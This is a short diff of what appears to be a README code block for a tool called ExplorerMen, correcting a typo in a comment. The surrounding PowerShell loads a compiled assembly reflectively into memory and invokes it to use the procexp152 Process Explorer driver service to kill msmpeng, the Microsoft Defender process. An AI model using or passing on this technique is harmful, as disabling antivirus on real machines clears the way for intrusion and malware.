@@ -38,6 +38,6 @@ $asm = [IO.File]::ReadAllBytes("C:\Users\Windy\source\ExplorerMen\bin\x64\Releas
 # Use reflection to load it into current process memory space
 [System.Reflection.Assembly]::Load($blob)
 
-# Launch the app, seratch for the service name procexp152 and kill process named msmpeng
+# Launch the app, search for the service name procexp152 and kill process named msmpeng
 [ExplorerMen.Program]::Main("/service:procexp152 /name:msmpeng".Split())
 ```
